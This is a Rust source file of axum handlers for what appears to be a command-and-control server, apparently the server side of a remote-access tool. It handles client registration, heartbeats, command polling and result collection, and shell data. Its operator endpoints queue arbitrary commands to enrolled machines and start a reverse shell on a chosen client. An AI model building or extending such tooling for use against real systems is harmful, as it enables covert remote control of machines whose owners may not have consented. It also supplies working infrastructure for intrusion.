use crate::state::AppState;
use axum::{
    extract::{Path, State},
    http::StatusCode,
    Json,
};
use common::message::{ClientInfo, CommandRequest, CommandResponse, Message, ShellData};

/// 客户端注册
pub async fn register_client(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        state.audit_logger.log_client_connect(&client_info);
        state.client_manager.register_client(client_info).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize client info for registration");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 心跳处理
pub async fn handle_heartbeat(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    // The payload for heartbeat is just the client_id as a string
    if let Ok(client_id) = String::from_utf8(message.payload) {
        state.client_manager.update_heartbeat(&client_id).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize client_id for heartbeat");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 获取客户端命令
pub async fn get_commands(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Json<Vec<CommandRequest>>, StatusCode> {
    let client_commands = state.client_manager.get_commands(&client_id).await;
    Ok(Json(client_commands))
}

/// 接收命令结果
pub async fn handle_command_result(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
        state.audit_logger.log_command_result(&result);
        state.client_manager.add_command_result(result).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize command result");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 处理Shell数据
pub async fn handle_shell_data(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(shell_data) = serde_json::from_slice::<ShellData>(&message.payload) {
        // Here you would typically forward this to a WebSocket or other real-time channel
        println!(
            "Received shell data from {}: {} bytes",
            shell_data.session_id,
            shell_data.data.len()
        );
        state
            .shell_manager
            .add_shell_data(
                &shell_data.session_id,
                String::from_utf8_lossy(&shell_data.data).to_string(),
            )
            .await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize shell data");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// 发送命令到客户端 (used by web UI)
pub async fn send_command(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(mut cmd): Json<CommandRequest>,
) -> Result<StatusCode, StatusCode> {
    cmd.client_id = client_id.clone();
    state.audit_logger.log_command_execution(&cmd);
    state.client_manager.add_command(&client_id, cmd).await;
    Ok(StatusCode::OK)
}

/// 获取客户端列表API (used by web UI)
pub async fn api_clients(State(state): State<AppState>) -> Json<Vec<ClientInfo>> {
    let clients_vec = state.client_manager.get_clients().await;
    Json(clients_vec)
}

/// 获取命令结果API (used by web UI)
pub async fn api_command_results(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Json<Vec<CommandResponse>> {
    let results = state.client_manager.get_command_results(&client_id).await;
    Json(results)
}

/// 启动反弹Shell (used by web UI)
pub async fn initiate_reverse_shell(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    // Create the shell session via the manager
    let session_id = state.shell_manager.create_session(&client_id).await;

    // Log the session creation
    if let Some(session) = state.shell_manager.get_session(&session_id).await {
        state.audit_logger.log_shell_session(&session);
    }

    // Create and send the reverse shell command
    let command = CommandRequest {
        client_id: client_id.clone(),
        command: "REVERSE_SHELL".to_string(),
        args: vec![session_id],
    };

    state.audit_logger.log_command_execution(&command);
    state.client_manager.add_command(&client_id, command).await;

    Ok(StatusCode::OK)
}
